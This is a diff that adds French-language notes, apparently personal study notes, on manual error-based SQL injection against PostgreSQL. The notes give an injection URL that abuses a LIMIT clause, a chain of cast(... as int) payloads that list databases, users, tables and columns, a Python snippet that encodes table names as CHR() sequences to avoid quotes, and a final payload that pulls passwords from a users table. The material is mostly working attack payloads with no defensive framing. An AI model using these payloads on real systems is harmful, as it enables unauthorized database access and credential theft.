@@ -1,0 +1,50 @@
+SQLi
+PostgreSQL
+error based
+
+    http://www.hackmantra.com/2011/07/manual-sql-injection-tutorial-postgre_05.html
+
+L'idée sur les error based, c'est d'afficher les infos voulues directement dans le message d'erreur retourné. Il faut donc que le système vulnérable laisse passer les erreurs créé par la requête injectée.
+
+Lorsqu'il y a une erreur, le DBMS va afficher un message explicite du genre :
+
+ERROR:  argument of LIMIT must be type bigint, not type text
+LINE 1: ...MIT;SELECT * FROM contents order by page ASC LIMIT(select version())
+                                                           ^
+
+mais on ne verra pas directement la version comme demandé. Il faut donc faire une requête qui va par exemple comparer 1 avec le résultat que l'on veut (ici, la version de la DB). Pour cela, il faut que version() soit interprété avant que l'erreur soit généré. L'astuce ici consiste à utiliser cast(version() as int) dans une sous requête. Par exemple :
+
+http://www.example.com/dir/page.php?&order=ASC LIMIT(select 1 from user where 1=cast(version() as int)) --
+
+(dans cet exemple, nous injectons après un ORDER BY, donc le seul endroit possible est dans la clause LIMIT) (avec MySQL on pourrait tenter dans la clause PROCEDURE, à voir.)
+
+Ensuite, il n'y a plus qu'à dérouler les requêtes pour trouver les databases, users, tables, colonnes, et enfin afficher le contenu de la table voulue en remplaçant le cast par ceux donnés ci-après. On peut faire varier l'offset pour parcourir les lignes.
+
+Lister les databases :
+
+cast((select datname from pg_database limit 1 offset 0) as int)
+
+Lister les users :
+
+cast((select user from pg_database limit 1 offset 0) as int)
+
+Lister les tables :
+
+cast((select table_name from information_schema.tables  limit 1 offset 0) as int)
+
+Ensuite pour afficher les colonnes d'une table, il faut convertir le nom de la table avec des conversions pour ne pas utiliser de quotes à l'aide d'un petit script comme ça :
+
+table = 'h4ck3r_t4bl3'
+t = []
+for i in table:
+	t.append('CHR('+str(ord(i))+')')
+print ' || '.join(t)
+
+pour pouvoir demander les colonnes :
+
+cast((select column_name from information_schema.columns where table_name= CHR(104) || … || CHR(51) limit 1 offset 0) as int)
+
+enfin, on demande les infos de la table :
+
+cast((select password from users limit 1 offset 0) as int)
+
